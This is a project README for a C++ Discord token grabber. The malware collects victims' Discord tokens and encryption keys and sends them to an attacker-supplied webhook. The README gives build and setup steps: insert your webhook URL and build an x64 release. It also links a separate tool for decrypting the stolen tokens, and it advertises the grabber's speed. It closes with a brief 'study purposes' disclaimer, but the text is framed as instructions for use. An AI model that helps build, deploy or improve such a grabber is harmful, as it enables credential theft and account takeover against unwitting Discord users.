# 💼 Discord Token Grabber
> **💫 A simple token grabber developed in C++.**


# 📁 Requirements
+ [Visual Studio](https://visualstudio.microsoft.com/) installed with C++.
+ The system must have a 64-bit processor architecture (x64) and be capable of running a 64-bit operating system and applications.


# 🔥 Features
+ **🪄 5x faster than other similar token grabbers**: This project divides each task into different threads, which makes the information collected and sent to the webhook simultaneously to save time.


# 📖 Instructions
1. Open the solution and add your webhool URL to the [Main.cpp](https://github.com/NotFxeel/Discord-Token-Grabber/blob/main/Discord%20Token%20Grabber/Main.cpp) file.

![image](https://github.com/NotFxeel/Discord-Token-Grabber/assets/161180618/c52f17ca-7c4c-4209-8403-1603ac6e41f3)

2. Build a x64 release.

![image](https://github.com/NotFxeel/Discord-Token-Grabber/assets/161180618/ba9e1f6c-b275-45f6-8ca0-10352d068dcd)

3. The grabber will log the raw token and the encrypted key, I was a bit lazy to implement it all in the same code, but I developed a python project to decrypt it and get the access token with these two elements, although you can use any other online program to help you with this. [My CLI Tool](https://github.com/NotFxeel/Token-Decryptor)

# ❗DISCLAIMER
*This project was developed by and for study purposes.*

*Regex in most paths except the main discord path are quite imprecise*
